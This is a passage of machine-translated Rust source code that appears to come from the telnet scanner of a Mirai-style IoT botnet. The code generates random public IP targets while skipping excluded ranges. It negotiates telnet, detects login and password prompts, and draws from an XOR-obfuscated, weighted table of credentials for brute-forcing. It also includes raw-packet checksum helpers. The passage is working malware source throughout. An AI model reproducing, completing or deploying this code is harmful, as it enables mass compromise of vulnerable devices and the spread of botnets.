                && o2 as libc::c_int == 98 as libc::c_int
                && o3 as libc::c_int >= 64 as libc::c_int
                && (o3 as libc::c_int) < 95 as libc::c_int
            || o1 as libc::c_int == 184 as libc::c_int
                && o2 as libc::c_int == 170 as libc::c_int
                && o3 as libc::c_int >= 240 as libc::c_int
                && (o3 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 192 as libc::c_int
                && o2 as libc::c_int == 111 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 143 as libc::c_int
            || o1 as libc::c_int == 192 as libc::c_int
                && o2 as libc::c_int == 252 as libc::c_int
                && o3 as libc::c_int >= 208 as libc::c_int
                && (o3 as libc::c_int) < 223 as libc::c_int
            || o1 as libc::c_int == 192 as libc::c_int
                && o2 as libc::c_int == 40 as libc::c_int
                && o3 as libc::c_int >= 56 as libc::c_int
                && (o3 as libc::c_int) < 59 as libc::c_int
            || o1 as libc::c_int == 198 as libc::c_int
                && o2 as libc::c_int == 8 as libc::c_int
                && o3 as libc::c_int >= 81 as libc::c_int
                && (o3 as libc::c_int) < 95 as libc::c_int
            || o1 as libc::c_int == 199 as libc::c_int
                && o2 as libc::c_int == 116 as libc::c_int
                && o3 as libc::c_int >= 112 as libc::c_int
                && (o3 as libc::c_int) < 119 as libc::c_int
            || o1 as libc::c_int == 199 as libc::c_int
                && o2 as libc::c_int == 229 as libc::c_int
                && o3 as libc::c_int >= 248 as libc::c_int
                && (o3 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 199 as libc::c_int
                && o2 as libc::c_int == 36 as libc::c_int
                && o3 as libc::c_int >= 220 as libc::c_int
                && (o3 as libc::c_int) < 223 as libc::c_int
            || o1 as libc::c_int == 199 as libc::c_int
                && o2 as libc::c_int == 58 as libc::c_int
                && o3 as libc::c_int >= 184 as libc::c_int
                && (o3 as libc::c_int) < 187 as libc::c_int
            || o1 as libc::c_int == 206 as libc::c_int
                && o2 as libc::c_int == 220 as libc::c_int
                && o3 as libc::c_int >= 172 as libc::c_int
                && (o3 as libc::c_int) < 175 as libc::c_int
            || o1 as libc::c_int == 208 as libc::c_int
                && o2 as libc::c_int == 78 as libc::c_int
                && o3 as libc::c_int >= 40 as libc::c_int
                && (o3 as libc::c_int) < 43 as libc::c_int
            || o1 as libc::c_int == 208 as libc::c_int
                && o2 as libc::c_int == 93 as libc::c_int
                && o3 as libc::c_int >= 192 as libc::c_int
                && (o3 as libc::c_int) < 193 as libc::c_int
            || o1 as libc::c_int == 66 as libc::c_int
                && o2 as libc::c_int == 71 as libc::c_int
                && o3 as libc::c_int >= 240 as libc::c_int
                && (o3 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 98 as libc::c_int
                && o2 as libc::c_int == 142 as libc::c_int
                && o3 as libc::c_int >= 208 as libc::c_int
                && (o3 as libc::c_int) < 223 as libc::c_int
            || o1 as libc::c_int == 107 as libc::c_int
                && o2 as libc::c_int >= 20 as libc::c_int
                && (o2 as libc::c_int) < 24 as libc::c_int
            || o1 as libc::c_int == 35 as libc::c_int
                && o2 as libc::c_int >= 159 as libc::c_int
                && (o2 as libc::c_int) < 183 as libc::c_int
            || o1 as libc::c_int == 52 as libc::c_int
                && o2 as libc::c_int >= 1 as libc::c_int
                && (o2 as libc::c_int) < 95 as libc::c_int
            || o1 as libc::c_int == 52 as libc::c_int
                && o2 as libc::c_int >= 95 as libc::c_int
                && (o2 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 54 as libc::c_int
                && o2 as libc::c_int >= 64 as libc::c_int
                && (o2 as libc::c_int) < 95 as libc::c_int
            || o1 as libc::c_int == 54 as libc::c_int
                && o2 as libc::c_int >= 144 as libc::c_int
                && (o2 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 13 as libc::c_int
                && o2 as libc::c_int >= 52 as libc::c_int
                && (o2 as libc::c_int) < 60 as libc::c_int
            || o1 as libc::c_int == 13 as libc::c_int
                && o2 as libc::c_int >= 112 as libc::c_int
                && (o2 as libc::c_int) < 115 as libc::c_int
            || o1 as libc::c_int == 163 as libc::c_int
                && o2 as libc::c_int == 172 as libc::c_int
            || o1 as libc::c_int == 51 as libc::c_int
                && o2 as libc::c_int >= 15 as libc::c_int
                && (o2 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 79 as libc::c_int
                && o2 as libc::c_int == 121 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 212 as libc::c_int
                && o2 as libc::c_int == 47 as libc::c_int
                && o3 as libc::c_int >= 224 as libc::c_int
                && (o3 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 89 as libc::c_int
                && o2 as libc::c_int == 34 as libc::c_int
                && o3 as libc::c_int >= 96 as libc::c_int
                && (o3 as libc::c_int) < 97 as libc::c_int
            || o1 as libc::c_int == 219 as libc::c_int
                && o2 as libc::c_int >= 216 as libc::c_int
                && (o2 as libc::c_int) < 231 as libc::c_int
            || o1 as libc::c_int == 23 as libc::c_int
                && o2 as libc::c_int >= 94 as libc::c_int
                && (o2 as libc::c_int) < 109 as libc::c_int
            || o1 as libc::c_int == 178 as libc::c_int
                && o2 as libc::c_int >= 62 as libc::c_int
                && (o2 as libc::c_int) < 63 as libc::c_int
            || o1 as libc::c_int == 106 as libc::c_int
                && o2 as libc::c_int >= 182 as libc::c_int
                && (o2 as libc::c_int) < 189 as libc::c_int
            || o1 as libc::c_int == 34 as libc::c_int
                && o2 as libc::c_int >= 245 as libc::c_int
                && (o2 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 87 as libc::c_int
                && o2 as libc::c_int >= 97 as libc::c_int
                && (o2 as libc::c_int) < 99 as libc::c_int
            || o1 as libc::c_int == 86 as libc::c_int
                && o2 as libc::c_int == 208 as libc::c_int
            || o1 as libc::c_int == 86 as libc::c_int
                && o2 as libc::c_int == 209 as libc::c_int
            || o1 as libc::c_int == 193 as libc::c_int
                && o2 as libc::c_int == 164 as libc::c_int
            || o1 as libc::c_int == 120 as libc::c_int
                && o2 as libc::c_int >= 103 as libc::c_int
                && (o2 as libc::c_int) < 108 as libc::c_int
            || o1 as libc::c_int == 188 as libc::c_int
                && o2 as libc::c_int == 68 as libc::c_int
            || o1 as libc::c_int == 78 as libc::c_int
                && o2 as libc::c_int == 46 as libc::c_int
            || o1 as libc::c_int == 224 as libc::c_int)
        {
            break;
        }
    }
    return ((((o1 as libc::c_int) << 24 as libc::c_int
        | (o2 as libc::c_int) << 16 as libc::c_int
        | (o3 as libc::c_int) << 8 as libc::c_int
        | (o4 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
        & 0xff as libc::c_int as libc::c_ulong) << 24 as libc::c_int
        | (((o1 as libc::c_int) << 24 as libc::c_int
            | (o2 as libc::c_int) << 16 as libc::c_int
            | (o3 as libc::c_int) << 8 as libc::c_int
            | (o4 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
            & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
        | (((o1 as libc::c_int) << 24 as libc::c_int
            | (o2 as libc::c_int) << 16 as libc::c_int
            | (o3 as libc::c_int) << 8 as libc::c_int
            | (o4 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
            & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
        | (((o1 as libc::c_int) << 24 as libc::c_int
            | (o2 as libc::c_int) << 16 as libc::c_int
            | (o3 as libc::c_int) << 8 as libc::c_int
            | (o4 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
            & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int)
        as uint32_t;
}
#[no_mangle]
pub unsafe extern "C" fn random_number(
    mut min_num: libc::c_int,
    mut max_num: libc::c_int,
) -> libc::c_int {
    let mut result: libc::c_int = 0 as libc::c_int;
    let mut low_num: libc::c_int = 0 as libc::c_int;
    let mut hi_num: libc::c_int = 0 as libc::c_int;
    if min_num < max_num {
        low_num = min_num;
        hi_num = max_num + 1 as libc::c_int;
    } else {
        low_num = max_num + 1 as libc::c_int;
        hi_num = min_num;
    }
    result = rand() % (hi_num - low_num) + low_num;
    return result;
}
#[no_mangle]
pub static mut scanner_pid: libc::c_int = 0;
#[no_mangle]
pub static mut rsck: libc::c_int = 0;
#[no_mangle]
pub static mut rsck_out: libc::c_int = 0;
#[no_mangle]
pub static mut auth_table_len: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut scanner_rawpkt: [libc::c_char; 40] = [
    0 as libc::c_int as libc::c_char,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
];
#[no_mangle]
pub static mut auth_table: *mut scanner_auth = 0 as *const scanner_auth
    as *mut scanner_auth;
#[no_mangle]
pub static mut conn_table: *mut scanner_connection = 0 as *const scanner_connection
    as *mut scanner_connection;
#[no_mangle]
pub static mut auth_table_max_weight: uint16_t = 0 as libc::c_int as uint16_t;
#[no_mangle]
pub static mut fake_time: uint32_t = 0 as libc::c_int as uint32_t;
#[no_mangle]
pub unsafe extern "C" fn recv_strip_null(
    mut sock: libc::c_int,
    mut buf: *mut libc::c_void,
    mut len: libc::c_int,
    mut flags: libc::c_int,
) -> libc::c_int {
    let mut ret: libc::c_int = recv(sock, buf, len as size_t, flags) as libc::c_int;
    if ret > 0 as libc::c_int {
        let mut i_0: libc::c_int = 0 as libc::c_int;
        i_0 = 0 as libc::c_int;
        while i_0 < ret {
            if *(buf as *mut libc::c_char).offset(i_0 as isize) as libc::c_int
                == 0 as libc::c_int
            {
                *(buf as *mut libc::c_char)
                    .offset(i_0 as isize) = 'A' as i32 as libc::c_char;
            }
            i_0 += 1;
        }
    }
    return ret;
}
#[no_mangle]
pub unsafe extern "C" fn util_local_addr() -> uint32_t {
    let mut fd: libc::c_int = 0;
    let mut addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    let mut addr_len: socklen_t = ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong
        as socklen_t;
    *__errno_location() = 0 as libc::c_int;
    fd = socket(2 as libc::c_int, SOCK_DGRAM as libc::c_int, 0 as libc::c_int);
    if fd == -(1 as libc::c_int) {
        return 0 as libc::c_int as uint32_t;
    }
    addr.sin_family = 2 as libc::c_int as sa_family_t;
    addr
        .sin_addr
        .s_addr = ((((1 as libc::c_int) << 24 as libc::c_int
        | (1 as libc::c_int) << 16 as libc::c_int
        | (1 as libc::c_int) << 8 as libc::c_int
        | (1 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
        & 0xff as libc::c_int as libc::c_ulong) << 24 as libc::c_int
        | (((1 as libc::c_int) << 24 as libc::c_int
            | (1 as libc::c_int) << 16 as libc::c_int
            | (1 as libc::c_int) << 8 as libc::c_int
            | (1 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
            & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
        | (((1 as libc::c_int) << 24 as libc::c_int
            | (1 as libc::c_int) << 16 as libc::c_int
            | (1 as libc::c_int) << 8 as libc::c_int
            | (1 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
            & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
        | (((1 as libc::c_int) << 24 as libc::c_int
            | (1 as libc::c_int) << 16 as libc::c_int
            | (1 as libc::c_int) << 8 as libc::c_int
            | (1 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
            & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int)
        as in_addr_t;
    addr
        .sin_port = ((53 as libc::c_int as libc::c_ushort as libc::c_int
        & 0xff as libc::c_int) << 8 as libc::c_int
        | (53 as libc::c_int as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as in_port_t;
    connect(
        fd,
        &mut addr as *mut sockaddr_in as *mut sockaddr,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
    );
    getsockname(fd, &mut addr as *mut sockaddr_in as *mut sockaddr, &mut addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}
unsafe extern "C" fn setup_connection(mut conn: *mut scanner_connection) {
    let mut addr: sockaddr_in = {
        let mut init = sockaddr_in {
            sin_family: 0 as libc::c_int as sa_family_t,
            sin_port: 0,
            sin_addr: in_addr { s_addr: 0 },
            sin_zero: [0; 8],
        };
        init
    };
    if (*conn).fd != -(1 as libc::c_int) {
        close((*conn).fd);
    }
    let ref mut fresh82 = (*conn).fd;
    *fresh82 = socket(2 as libc::c_int, SOCK_STREAM as libc::c_int, 0 as libc::c_int);
    if *fresh82 == -(1 as libc::c_int) {
        return;
    }
    (*conn).rdbuf_pos = 0 as libc::c_int;
    util_zero(
        ((*conn).rdbuf).as_mut_ptr() as *mut libc::c_void,
        ::std::mem::size_of::<[libc::c_char; 256]>() as libc::c_ulong as libc::c_int,
    );
    fcntl(
        (*conn).fd,
        4 as libc::c_int,
        0o4000 as libc::c_int | fcntl((*conn).fd, 3 as libc::c_int, 0 as libc::c_int),
    );
    addr.sin_family = 2 as libc::c_int as sa_family_t;
    addr.sin_addr.s_addr = (*conn).dst_addr;
    addr.sin_port = (*conn).dst_port;
    (*conn).last_recv = fake_time as libc::c_int;
    (*conn).state = SC_CONNECTING;
    connect(
        (*conn).fd,
        &mut addr as *mut sockaddr_in as *mut sockaddr,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
    );
}
static mut x: uint32_t = 0;
static mut y: uint32_t = 0;
static mut z: uint32_t = 0;
static mut w: uint32_t = 0;
#[no_mangle]
pub unsafe extern "C" fn rand_xywz() {
    x = time(0 as *mut time_t) as uint32_t;
    y = (getpid() ^ getppid()) as uint32_t;
    w = x ^ y;
}
#[no_mangle]
pub unsafe extern "C" fn rand_next() -> uint32_t {
    let mut t: uint32_t = x;
    t ^= t << 11 as libc::c_int;
    t ^= t >> 8 as libc::c_int;
    x = y;
    y = z;
    z = w;
    w ^= w >> 19 as libc::c_int;
    w ^= t;
    return w;
}
unsafe extern "C" fn get_random_ip() -> uint32_t {
    let mut tmp: uint32_t = 0;
    let mut o1: uint8_t = 0;
    let mut o2: uint8_t = 0;
    let mut o3: uint8_t = 0;
    let mut o4: uint8_t = 0;
    loop {
        tmp = rand_next();
        o1 = (tmp & 0xff as libc::c_int as libc::c_uint) as uint8_t;
        o2 = (tmp >> 8 as libc::c_int & 0xff as libc::c_int as libc::c_uint) as uint8_t;
        o3 = (tmp >> 16 as libc::c_int & 0xff as libc::c_int as libc::c_uint) as uint8_t;
        o4 = (tmp >> 24 as libc::c_int & 0xff as libc::c_int as libc::c_uint) as uint8_t;
        if !(o1 as libc::c_int == 127 as libc::c_int
            || o1 as libc::c_int == 0 as libc::c_int
            || o1 as libc::c_int == 3 as libc::c_int
            || (o1 as libc::c_int == 15 as libc::c_int
                || o1 as libc::c_int == 16 as libc::c_int)
            || o1 as libc::c_int == 56 as libc::c_int
            || o1 as libc::c_int == 10 as libc::c_int
            || o1 as libc::c_int == 192 as libc::c_int
                && o2 as libc::c_int == 168 as libc::c_int
            || o1 as libc::c_int == 172 as libc::c_int
                && o2 as libc::c_int >= 16 as libc::c_int
                && (o2 as libc::c_int) < 32 as libc::c_int
            || o1 as libc::c_int == 100 as libc::c_int
                && o2 as libc::c_int >= 64 as libc::c_int
                && (o2 as libc::c_int) < 127 as libc::c_int
            || o1 as libc::c_int == 169 as libc::c_int
                && o2 as libc::c_int > 254 as libc::c_int
            || o1 as libc::c_int == 198 as libc::c_int
                && o2 as libc::c_int >= 18 as libc::c_int
                && (o2 as libc::c_int) < 20 as libc::c_int
            || o1 as libc::c_int >= 224 as libc::c_int
            || (o1 as libc::c_int == 6 as libc::c_int
                || o1 as libc::c_int == 7 as libc::c_int
                || o1 as libc::c_int == 11 as libc::c_int
                || o1 as libc::c_int == 21 as libc::c_int
                || o1 as libc::c_int == 22 as libc::c_int
                || o1 as libc::c_int == 26 as libc::c_int
                || o1 as libc::c_int == 28 as libc::c_int
                || o1 as libc::c_int == 29 as libc::c_int
                || o1 as libc::c_int == 30 as libc::c_int
                || o1 as libc::c_int == 33 as libc::c_int
                || o1 as libc::c_int == 55 as libc::c_int
                || o1 as libc::c_int == 214 as libc::c_int
                || o1 as libc::c_int == 215 as libc::c_int))
        {
            break;
        }
    }
    return ((((o1 as libc::c_int) << 24 as libc::c_int
        | (o2 as libc::c_int) << 16 as libc::c_int
        | (o3 as libc::c_int) << 8 as libc::c_int
        | (o4 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
        & 0xff as libc::c_int as libc::c_ulong) << 24 as libc::c_int
        | (((o1 as libc::c_int) << 24 as libc::c_int
            | (o2 as libc::c_int) << 16 as libc::c_int
            | (o3 as libc::c_int) << 8 as libc::c_int
            | (o4 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
            & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
        | (((o1 as libc::c_int) << 24 as libc::c_int
            | (o2 as libc::c_int) << 16 as libc::c_int
            | (o3 as libc::c_int) << 8 as libc::c_int
            | (o4 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
            & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
        | (((o1 as libc::c_int) << 24 as libc::c_int
            | (o2 as libc::c_int) << 16 as libc::c_int
            | (o3 as libc::c_int) << 8 as libc::c_int
            | (o4 as libc::c_int) << 0 as libc::c_int) as libc::c_ulong
            & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int)
        as uint32_t;
}
unsafe extern "C" fn can_consume(
    mut conn: *mut scanner_connection,
    mut ptr: *mut uint8_t,
    mut amount: libc::c_int,
) -> libc::c_int {
    let mut end: *mut uint8_t = ((*conn).rdbuf)
        .as_mut_ptr()
        .offset((*conn).rdbuf_pos as isize) as *mut uint8_t;
    return (ptr.offset(amount as isize) < end) as libc::c_int;
}
unsafe extern "C" fn consume_iacs(mut conn: *mut scanner_connection) -> libc::c_int {
    let mut consumed: libc::c_int = 0 as libc::c_int;
    let mut ptr: *mut uint8_t = ((*conn).rdbuf).as_mut_ptr() as *mut uint8_t;
    while consumed < (*conn).rdbuf_pos {
        let mut i_0: libc::c_int = 0;
        if *ptr as libc::c_int != 0xff as libc::c_int {
            break;
        }
        if !(*ptr as libc::c_int == 0xff as libc::c_int) {
            continue;
        }
        if can_consume(conn, ptr, 1 as libc::c_int) == 0 {
            break;
        }
        if *ptr.offset(1 as libc::c_int as isize) as libc::c_int == 0xff as libc::c_int {
            ptr = ptr.offset(2 as libc::c_int as isize);
            consumed += 2 as libc::c_int;
        } else {
            if *ptr.offset(1 as libc::c_int as isize) as libc::c_int
                == 0xfd as libc::c_int
            {
                let mut tmp1: [uint8_t; 3] = [
                    255 as libc::c_int as uint8_t,
                    251 as libc::c_int as uint8_t,
                    31 as libc::c_int as uint8_t,
                ];
                let mut tmp2: [uint8_t; 9] = [
                    255 as libc::c_int as uint8_t,
                    250 as libc::c_int as uint8_t,
                    31 as libc::c_int as uint8_t,
                    0 as libc::c_int as uint8_t,
                    80 as libc::c_int as uint8_t,
                    0 as libc::c_int as uint8_t,
                    24 as libc::c_int as uint8_t,
                    255 as libc::c_int as uint8_t,
                    240 as libc::c_int as uint8_t,
                ];
                if can_consume(conn, ptr, 2 as libc::c_int) == 0 {
                    break;
                }
                if !(*ptr.offset(2 as libc::c_int as isize) as libc::c_int
                    != 31 as libc::c_int)
                {
                    ptr = ptr.offset(3 as libc::c_int as isize);
                    consumed += 3 as libc::c_int;
                    send(
                        (*conn).fd,
                        tmp1.as_mut_ptr() as *const libc::c_void,
                        3 as libc::c_int as size_t,
                        MSG_NOSIGNAL as libc::c_int,
                    );
                    send(
                        (*conn).fd,
                        tmp2.as_mut_ptr() as *const libc::c_void,
                        9 as libc::c_int as size_t,
                        MSG_NOSIGNAL as libc::c_int,
                    );
                    continue;
                }
            }
            if can_consume(conn, ptr, 2 as libc::c_int) == 0 {
                break;
            }
            i_0 = 0 as libc::c_int;
            while i_0 < 3 as libc::c_int {
                if *ptr.offset(i_0 as isize) as libc::c_int == 0xfd as libc::c_int {
                    *ptr.offset(i_0 as isize) = 0xfc as libc::c_int as uint8_t;
                } else if *ptr.offset(i_0 as isize) as libc::c_int == 0xfb as libc::c_int
                {
                    *ptr.offset(i_0 as isize) = 0xfd as libc::c_int as uint8_t;
                }
                i_0 += 1;
            }
            send(
                (*conn).fd,
                ptr as *const libc::c_void,
                3 as libc::c_int as size_t,
                MSG_NOSIGNAL as libc::c_int,
            );
            ptr = ptr.offset(3 as libc::c_int as isize);
            consumed += 3 as libc::c_int;
        }
    }
    return consumed;
}
unsafe extern "C" fn consume_any_prompt(
    mut conn: *mut scanner_connection,
) -> libc::c_int {
    let mut pch: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut i_0: libc::c_int = 0;
    let mut prompt_ending: libc::c_int = -(1 as libc::c_int);
    i_0 = (*conn).rdbuf_pos - 1 as libc::c_int;
    while i_0 > 0 as libc::c_int {
        if (*conn).rdbuf[i_0 as usize] as libc::c_int == ':' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '>' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '$' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '#' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '%' as i32
        {
            prompt_ending = i_0 + 1 as libc::c_int;
            break;
        } else {
            i_0 -= 1;
        }
    }
    if prompt_ending == -(1 as libc::c_int) {
        return 0 as libc::c_int
    } else {
        return prompt_ending
    };
}
unsafe extern "C" fn consume_user_prompt(
    mut conn: *mut scanner_connection,
) -> libc::c_int {
    let mut pch: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut i_0: libc::c_int = 0;
    let mut prompt_ending: libc::c_int = -(1 as libc::c_int);
    i_0 = (*conn).rdbuf_pos - 1 as libc::c_int;
    while i_0 > 0 as libc::c_int {
        if (*conn).rdbuf[i_0 as usize] as libc::c_int == ':' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '>' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '$' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '#' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '%' as i32
        {
            prompt_ending = i_0 + 1 as libc::c_int;
            break;
        } else {
            i_0 -= 1;
        }
    }
    if prompt_ending == -(1 as libc::c_int) {
        let mut tmp: libc::c_int = 0;
        tmp = util_memsearch(
            ((*conn).rdbuf).as_mut_ptr(),
            (*conn).rdbuf_pos,
            b"ogin\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
            4 as libc::c_int,
        );
        if tmp != -(1 as libc::c_int) {
            prompt_ending = tmp;
        } else {
            tmp = util_memsearch(
                ((*conn).rdbuf).as_mut_ptr(),
                (*conn).rdbuf_pos,
                b"enter\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
                5 as libc::c_int,
            );
            if tmp != -(1 as libc::c_int) {
                prompt_ending = tmp;
            }
        }
    }
    if prompt_ending == -(1 as libc::c_int) {
        return 0 as libc::c_int
    } else {
        return prompt_ending
    };
}
unsafe extern "C" fn consume_pass_prompt(
    mut conn: *mut scanner_connection,
) -> libc::c_int {
    let mut pch: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut i_0: libc::c_int = 0;
    let mut prompt_ending: libc::c_int = -(1 as libc::c_int);
    i_0 = (*conn).rdbuf_pos - 1 as libc::c_int;
    while i_0 > 0 as libc::c_int {
        if (*conn).rdbuf[i_0 as usize] as libc::c_int == ':' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '>' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '$' as i32
            || (*conn).rdbuf[i_0 as usize] as libc::c_int == '#' as i32
        {
            prompt_ending = i_0 + 1 as libc::c_int;
            break;
        } else {
            i_0 -= 1;
        }
    }
    if prompt_ending == -(1 as libc::c_int) {
        let mut tmp: libc::c_int = 0;
        tmp = util_memsearch(
            ((*conn).rdbuf).as_mut_ptr(),
            (*conn).rdbuf_pos,
            b"assword\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
            7 as libc::c_int,
        );
        if tmp != -(1 as libc::c_int) {
            prompt_ending = tmp;
        }
    }
    if prompt_ending == -(1 as libc::c_int) {
        return 0 as libc::c_int
    } else {
        return prompt_ending
    };
}
unsafe extern "C" fn deobf(
    mut str: *mut libc::c_char,
    mut len: *mut libc::c_int,
) -> *mut libc::c_char {
    let mut i_0: libc::c_int = 0;
    let mut cpy: *mut libc::c_char = 0 as *mut libc::c_char;
    *len = util_strlen(str);
    cpy = malloc((*len + 1 as libc::c_int) as libc::c_ulong) as *mut libc::c_char;
    util_memcpy(
        cpy as *mut libc::c_void,
        str as *mut libc::c_void,
        *len + 1 as libc::c_int,
    );
    i_0 = 0 as libc::c_int;
    while i_0 < *len {
        let ref mut fresh83 = *cpy.offset(i_0 as isize);
        *fresh83 = (*fresh83 as libc::c_int ^ 0xde as libc::c_int) as libc::c_char;
        let ref mut fresh84 = *cpy.offset(i_0 as isize);
        *fresh84 = (*fresh84 as libc::c_int ^ 0xad as libc::c_int) as libc::c_char;
        let ref mut fresh85 = *cpy.offset(i_0 as isize);
        *fresh85 = (*fresh85 as libc::c_int ^ 0xbe as libc::c_int) as libc::c_char;
        let ref mut fresh86 = *cpy.offset(i_0 as isize);
        *fresh86 = (*fresh86 as libc::c_int ^ 0xef as libc::c_int) as libc::c_char;
        i_0 += 1;
    }
    return cpy;
}
unsafe extern "C" fn add_auth_entry(
    mut enc_user: *mut libc::c_char,
    mut enc_pass: *mut libc::c_char,
    mut weight: uint16_t,
) {
    let mut tmp: libc::c_int = 0;
    auth_table = realloc(
        auth_table as *mut libc::c_void,
        ((auth_table_len + 1 as libc::c_int) as libc::c_ulong)
            .wrapping_mul(::std::mem::size_of::<scanner_auth>() as libc::c_ulong),
    ) as *mut scanner_auth;
    let ref mut fresh87 = (*auth_table.offset(auth_table_len as isize)).username;
    *fresh87 = deobf(enc_user, &mut tmp);
    (*auth_table.offset(auth_table_len as isize)).username_len = tmp as uint8_t;
    let ref mut fresh88 = (*auth_table.offset(auth_table_len as isize)).password;
    *fresh88 = deobf(enc_pass, &mut tmp);
    (*auth_table.offset(auth_table_len as isize)).password_len = tmp as uint8_t;
    (*auth_table.offset(auth_table_len as isize)).weight_min = auth_table_max_weight;
    let fresh89 = auth_table_len;
    auth_table_len = auth_table_len + 1;
    (*auth_table.offset(fresh89 as isize))
        .weight_max = (auth_table_max_weight as libc::c_int + weight as libc::c_int)
        as uint16_t;
    auth_table_max_weight = (auth_table_max_weight as libc::c_int
        + weight as libc::c_int) as uint16_t;
}
unsafe extern "C" fn random_auth_entry() -> *mut scanner_auth {
    let mut i_0: libc::c_int = 0;
    let mut r: uint16_t = (rand_next())
        .wrapping_rem(auth_table_max_weight as libc::c_uint) as uint16_t;
    i_0 = 0 as libc::c_int;
    while i_0 < auth_table_len {
        if !((r as libc::c_int)
            < (*auth_table.offset(i_0 as isize)).weight_min as libc::c_int)
        {
            if (r as libc::c_int)
                < (*auth_table.offset(i_0 as isize)).weight_max as libc::c_int
            {
                return &mut *auth_table.offset(i_0 as isize) as *mut scanner_auth;
            }
        }
        i_0 += 1;
    }
    return 0 as *mut scanner_auth;
}
#[no_mangle]
pub unsafe extern "C" fn checksum_generic(
    mut addr: *mut uint16_t,
    mut count: uint32_t,
) -> uint16_t {
    let mut sum: libc::c_ulong = 0 as libc::c_int as libc::c_ulong;
    sum = 0 as libc::c_int as libc::c_ulong;
    while count > 1 as libc::c_int as libc::c_uint {
        let fresh90 = addr;
        addr = addr.offset(1);
        sum = sum.wrapping_add(*fresh90 as libc::c_ulong);
        count = (count as libc::c_uint).wrapping_sub(2 as libc::c_int as libc::c_uint)
            as uint32_t as uint32_t;
    }
    if count == 1 as libc::c_int as libc::c_uint {
        sum = sum.wrapping_add(*addr as libc::c_char as libc::c_ulong);
    }
    sum = (sum >> 16 as libc::c_int)
        .wrapping_add(sum & 0xffff as libc::c_int as libc::c_ulong);
    sum = sum.wrapping_add(sum >> 16 as libc::c_int);
    return !sum as uint16_t;
}
#[no_mangle]
pub unsafe extern "C" fn checksum_tcpudp(
    mut iph: *mut iphdr,
    mut buff: *mut libc::c_void,
    mut data_len: uint16_t,
    mut len: libc::c_int,
) -> uint16_t {
    let mut buf: *const uint16_t = buff as *const uint16_t;
    let mut ip_src: uint32_t = (*iph).saddr;
    let mut ip_dst: uint32_t = (*iph).daddr;
    let mut sum: uint32_t = 0 as libc::c_int as uint32_t;
    let mut length: libc::c_int = len;
    while len > 1 as libc::c_int {
        sum = (sum as libc::c_uint).wrapping_add(*buf as libc::c_uint) as uint32_t
            as uint32_t;
        buf = buf.offset(1);
        len -= 2 as libc::c_int;
    }
    if len == 1 as libc::c_int {
        sum = (sum as libc::c_uint).wrapping_add(*(buf as *mut uint8_t) as libc::c_uint)
            as uint32_t as uint32_t;
    }
    sum = (sum as libc::c_uint)
        .wrapping_add(
            ip_src >> 16 as libc::c_int & 0xffff as libc::c_int as libc::c_uint,
        ) as uint32_t as uint32_t;
    sum = (sum as libc::c_uint)
        .wrapping_add(ip_src & 0xffff as libc::c_int as libc::c_uint) as uint32_t
